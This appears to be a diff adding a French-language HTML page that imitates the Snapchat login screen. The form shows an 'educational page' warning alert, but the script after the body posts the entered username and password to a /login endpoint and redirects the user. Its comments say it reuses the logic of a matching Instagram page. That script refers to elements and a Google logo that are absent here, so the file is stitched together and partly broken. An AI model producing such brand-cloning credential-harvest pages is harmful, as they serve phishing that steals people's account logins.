@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fffc00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+            text-align: center;
+            width: 360px;
+            position: relative;
+        }
+
+        h2 {
+            color: #000000;
+            font-size: 30px;
+            margin-bottom: 3px;
+            text-shadow: 1px 1px 2px black;
+        }
+
+        img.logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+
+        button {
+            width: 75%;
+            padding: 12px;
+            background-color: #0096e5;
+            border: none;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.2);
+        }
+
+        .warning {
+            color: red;
+            font-size: 14px;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+
+        .url-warning {
+            color: black;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .annotation {
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            background-color: rgba(255,0,0,0.1);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: bold;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="annotation"></div>
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Logo Snapchat">
+        <h2>Snapchat</h2>
+        <p class="url-warning"></p>
+        <form onsubmit="alert('Page pédagogique : ne jamais entrer vos informations sur des sites inconnus !'); return false;">
+            <input type="text" placeholder="Nom d'utilisateur" required><br>
+            <input type="password" placeholder="Mot de passe" required><br>
+            <button type="submit" style="color: #ccc;">Se connecter</button>
+        </form>
+        <p class="warning"></p>
+        <p class="url-warning"></p>
+    </div>
+</body>
+
+    <script>
+        // Gestion du formulaire de connexion (même logique que la page Instagram)
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const loading = document.getElementById('loading');
+            const error = document.getElementById('error');
+            
+            error.style.display = 'none';
+            error.textContent = '';
+            
+            if (!username || !password) {
+                error.textContent = 'Veuillez remplir tous les champs';
+                error.style.display = 'block';
+                return;
+            }
+            
+            // Validation email basique
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(username) && !/^\d+$/.test(username)) {
+                error.textContent = 'Veuillez saisir une adresse e-mail ou un numéro de téléphone valide';
+                error.style.display = 'block';
+                return;
+            }
+            
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Connexion...';
+            loading.style.display = 'block';
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    if (data.redirect) {
+                        window.location.href = data.redirect;
+                    } else {
+                        alert('Connexion réussie !');
+                    }
+                } else {
+                    throw new Error(data.message || 'Erreur de connexion');
+                }
+                
+            } catch (err) {
+                console.error('Erreur:', err);
+                error.textContent = 'Nom d\'utilisateur ou mot de passe incorrect. Réessayez ou cliquez sur "Adresse e-mail oubliée ?" pour récupérer votre compte.';
+                error.style.display = 'block';
+                
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Suivant';
+                loading.style.display = 'none';
+            }
+        });
+
+        // Effets sur les champs de saisie (même logique que Instagram)
+        document.querySelectorAll('.input-field').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.transform = 'scale(1.01)';
+                this.style.transition = 'transform 0.2s ease';
+            });
+
+            input.addEventListener('blur', function() {
+                this.style.transform = 'scale(1)';
+            });
+
+            input.addEventListener('input', function() {
+                const error = document.getElementById('error');
+                error.style.display = 'none';
+                error.textContent = '';
+            });
+        });
+
+        // Animation du logo Google au chargement
+        window.addEventListener('load', function() {
+            const logoLetters = document.querySelectorAll('.google-logo span');
+            logoLetters.forEach((letter, index) => {
+                setTimeout(() => {
+                    letter.style.transform = 'scale(1.2)';
+                    letter.style.transition = 'transform 0.3s ease';
+                    setTimeout(() => {
+                        letter.style.transform = 'scale(1)';
+                    }, 200);
+                }, index * 100);
+            });
+        });
+    </script>
+</body>
+</html>
